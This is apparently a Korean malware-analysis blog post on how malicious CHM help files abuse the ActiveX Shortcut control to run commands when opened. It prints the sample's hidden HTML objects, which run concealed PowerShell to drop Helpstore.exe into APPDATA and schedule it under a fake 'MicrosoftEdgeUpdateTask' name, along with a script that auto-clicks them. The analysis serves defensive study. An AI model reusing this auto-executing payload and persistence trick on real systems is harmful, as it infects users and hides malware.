---
title: 'π“‘ "CHM", Malware Analysis'
date: 2024-12-08 21:00:00 +0900
categories: [Malware Analysis Guide]
tags: [malware_analysis_guide, chm]
render_with_liquid: false
---

CHM νμΌ(Compiled HTML Help File)μ€ λ„μ›€λ§ νμΌμ΄λΌκ³ λ„ λ¶λ¦¬λ©°, Microsoftμ—μ„ κ°λ°ν• νμΌ ν•μ‹μΌλ΅ HTML λ¬Έμ„μ™€ κ΄€λ ¨ λ¦¬μ†μ¤λ¥Ό ν•λ‚μ νμΌλ΅ μ••μ¶•ν•μ—¬ μ €μ¥ν• νμΌμ…λ‹λ‹¤. κ³µκ²©μλ” CHM νμΌμ΄ ActiveXλ¥Ό μ§€μ›ν•λ” κ²ƒμ„ μ•…μ©ν•μ—¬, λ‹¨μν CHM νμΌμ„ μ¤ν”ν•λ” κ²ƒλ§μΌλ΅ μ‚¬μ©μμ κ°„μ„­μ—†μ΄ μ•…μ„±μ½”λ“λ¥Ό μ‹¤ν–‰ν•©λ‹λ‹¤.


## <mark>0. CHM νμΌ</mark>

CHM νμΌμ€ μΌλ°μ μΌλ΅ μλ„μ° λ„μ›€λ§μ— ν™μ©λλ” νμΌμ…λ‹λ‹¤. κ³µκ²©μλ” ν•΄λ‹Ή λ¶€λ¶„μ„ μ•…μ©ν•μ—¬ λ§μΉ μ •μƒ νμΌμ²λΌ μ„μ¥ν•μ—¬ μ•…μ„±μ½”λ“λ¥Ό μ‹¤ν–‰ν•κ² λ§λ“­λ‹λ‹¤.

<img src="../images/2024-12-08-CHM-Malware-Analysis/IMG-chm λ¶„μ„-20240911174428810-1733664241224-1.png" alt="IMG-chm λ¶„μ„-20240911174428810" style="zoom:80%;" />

CHM νμΌμ„ μ‹¤ν–‰ν•κ² λλ©΄, hh.exeλΌλ” microsoft html help executable programμ„ μ‚¬μ©ν•μ—¬ μ‹¤ν–‰λκ² λ©λ‹λ‹¤.

<img src="../images/2024-12-08-CHM-Malware-Analysis/IMG-chm λ¶„μ„-20240911174711040-1733664261923-5.png" alt="IMG-chm λ¶„μ„-20240911174711040" style="zoom:80%;" />

<img src="../images/2024-12-08-CHM-Malware-Analysis/IMG-chm λ¶„μ„-20240911174737407-1733664268659-7.png" alt="IMG-chm λ¶„μ„-20240911174737407" style="zoom:67%;" />

HTML λ¬Έμ„μ™€ λ¦¬μ†μ¤κ°€ ν•λ‚μ νμΌλ΅ μ••μ¶•λμ–΄ μκΈ° λ•λ¬Έμ— μ••μ¶• ν•΄μ λ¥Ό ν†µν•΄ νμΌ λ‚΄λ¶€λ¥Ό ν™•μΈν•  μ μμµλ‹λ‹¤. λ‚΄λ¶€μ— μμ‹¬μ¤λ¬μ΄ νμΌμ΄ μ΅΄μ¬ν•λ”μ§€, μ΅΄μ¬ν•λ” HTML νμΌ λ‚΄μ— ActiveX κ΄€λ ¨ μ½”λ“κ°€ μ΅΄μ¬ν•λ”μ§€ ν™•μΈν•  ν•„μ”κ°€ μμµλ‹λ‹¤.

<img src="../images/2024-12-08-CHM-Malware-Analysis/IMG-chm λ¶„μ„-20240911174511185-1733664278673-9.png" alt="IMG-chm λ¶„μ„-20240911174511185" style="zoom: 80%;" />



## <mark>1. ActiveX Shortcut</mark>

ActiveX Shortcut Commandλ” μ§€μ •λ μ‘μ—…μ Shortcutμ„ μƒμ„±ν•©λ‹λ‹¤. μ—¬κΈ°μ„ μ¤‘μ”ν• μ†μ„±μ€ Item1μΌλ΅ μ‹¤ν–‰ νμΌμ— λ€ν• κ²½λ΅μ™€ λ§¤κ°λ³€μλ¥Ό μ§€μ •ν•  μ μμµλ‹λ‹¤. κ³µκ²©μλ” ν•΄λ‹Ή μ†μ„±μ— λ…λ Ήμ–΄λ¥Ό μ‚½μ…ν•μ—¬ μ•…μ„± ν–‰μ„λ¥Ό μν–‰ν•©λ‹λ‹¤.

> π”—[About ActiveX Shortcut Command](https://documentation.help/HTML-Help-ActiveX/ocx_shortcut.htm)

| **Property**                                                 | **Description**                                              |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [Button](https://documentation.help/HTML-Help-ActiveX/ocx_pbutton.htm) | Specifies the button style. Optional.                        |
| [Command](https://documentation.help/HTML-Help-ActiveX/ocx_pcommand.htm) | Calls the **Shortcut** command.                              |
| [Font](https://documentation.help/HTML-Help-ActiveX/ocx_pfont.htm) | Specifies the font attributes. Optional.                     |
| [Item1](https://documentation.help/HTML-Help-ActiveX/ocx_pitem.htm) | Specifies the file path to the executable file (.exe) for the program, and any parameters to be sent to the program. These values are delimited by a comma. HTML Help does not support `%WINDIR%` or other system variables in the file path. |
| [Item2](https://documentation.help/HTML-Help-ActiveX/ocx_pitem.htm) | Specifies the message ID of a standard Windows message, a *wPARAM* value, and a *lPARAM* value. These values are delimited by a comma. |
| [Text](https://documentation.help/HTML-Help-ActiveX/ocx_ptext.htm) | Specifies the link text. Optional.                           |



## <mark>2. μ•…μ„± CHM μƒν” λ¶„μ„</mark>

### β– <u>νμΌ λ‚΄λ¶€ ν™•μΈ</u>

μ••μ¶• ν•΄μ λ¥Ό ν†µν•΄ CHM νμΌ λ‚΄λ¶€λ¥Ό ν™•μΈν•μ—¬ μμ‹¬μ¤λ¬μ΄ νμΌμ΄ μ΅΄μ¬ν•λ”μ§€ ν™•μΈν•©λ‹λ‹¤. μƒν”μ—μ„λ” Helpstore.exe λΌλ” μ‹¤ν–‰ νμΌμ΄ ν™•μΈλμ—μµλ‹λ‹¤.

<img src="../images/2024-12-08-CHM-Malware-Analysis/IMG-chm λ¶„μ„-20240911174149846-1733664290193-11.png" alt="IMG-chm λ¶„μ„-20240911174149846" style="zoom:80%;" />

ν•΄λ‹Ή νμΌμ„ PPEE, pestudioλ¥Ό μ‚¬μ©ν•΄ ν™•μΈν•΄λ³΄λ‹ μμ‹¬μ¤λ¬μ΄ λ¦¬μ†μ¤κ°€ ν™•μΈλμ—μµλ‹λ‹¤.

<img src="../images/2024-12-08-CHM-Malware-Analysis/IMG-chm λ¶„μ„-20240911175412249-1733664311365-13.png" alt="IMG-chm λ¶„μ„-20240911175412249" style="zoom:67%;" />



### β– <u>HTML νμΌ ν™•μΈ</u>

CHM νμΌμ„ μ‹¤ν–‰ν•κ² λλ©΄, λ‚΄λ¶€μ— μ΅΄μ¬ν•λ” HTML νμΌλ“¤μ΄ μ‹¤ν–‰λκ² λκΈ° λ•λ¬Έμ— λ‚΄λ¶€μ— μ•…μ„± μ¤ν¬λ¦½νΈκ°€ μ΅΄μ¬ν•λ”μ§€ ν™•μΈν•  ν•„μ”κ°€ μμµλ‹λ‹¤. μƒν” λ‚΄λ¶€μ—λ” index.html νμΌμ΄ μ΅΄μ¬ν–κ³  μ½”λ“λ¥Ό ν™•μΈν•΄λ³΄λ‹ ActiveX ShortCut λ…λ Ήμ–΄κ°€ ν™•μΈλμ—μµλ‹λ‹¤.

<img src="../images/2024-12-08-CHM-Malware-Analysis/image-20241208230607334.png" alt="image-20241208230607334" style="zoom:80%;" />

### β– <u>ActiveX ShortCut λ¶„μ„</u>

κ³µκ²©μλ” **CLSID_HHCtrl Object = {adb880a6-d8ff-11cf-9377-00aa003b7a11}**λ¥Ό μ‚¬μ©ν•΄ HHCtrl Objectλ¥Ό μƒμ„±ν•μ—¬ ActiveX Shortcutμ„ μ‚¬μ©ν•©λ‹λ‹¤. Item1 μ†μ„±μ„ ν™•μΈν•΄λ³΄λ‹, Helpstore.exeλ¥Ό λ“λ΅­ν•κ³  schtasksλ¥Ό μ‚¬μ©ν•μ—¬ μ¤μΌ€μ¤„λ¬μ— λ“±λ΅ν•λ” cmd λ…λ Ήμ–΄κ°€ λ°κ²¬λμ—μµλ‹λ‹¤.

```html
<OBJECT id =qjswc classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1 style="display:none;">
	<PARAM name = "Command" value = "ShortCut">
	<PARAM name = "Button" value = "Bitmap::shortcut">
	<PARAM name = "Item1" value = ',cmd.exe,/c start /min /b powershell.exe -command "If (Test-Path \"$env:TEMP\") { Get-ChildItem \"$env:TEMP\" -File | Where-Object { $_.Length -eq 1596928 } | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"$env:APPDATA\\Helpstore.exe\" -Force } }"'>
</OBJECT>

<OBJECT id=oheam classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=100 height=100 style="display:none;">
	<PARAM name="Command" value="ShortCut">
	<PARAM name="Button" value="Bitmap::shortcut">
	<PARAM name="Item1" value=',cmd.exe,/c start /min /b powershell.exe -WindowStyle Hidden -Command "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"%APPDATA%\Helpstore.exe\" /sc ONCE /st (Get-Date).AddMinutes(1).ToString(\"HH:mm\")"'>
</OBJECT>
```

μ•…μ„± CHM νμΌμ€ μƒμ„±λ HHCtrl Objectμ Click λ©”μ„λ“λ¥Ό μ‚¬μ©ν•μ—¬, CHM νμΌμ„ μ‹¤ν–‰ν•κ² λλ©΄ μ§€μ •ν• λ…λ Ήμ΄ μ‹¤ν–‰λκ² μ½”λ”©λμ–΄ μμµλ‹λ‹¤.

```html
<script>
	qjswc.Click();
	oheam.Click();
</script>
```

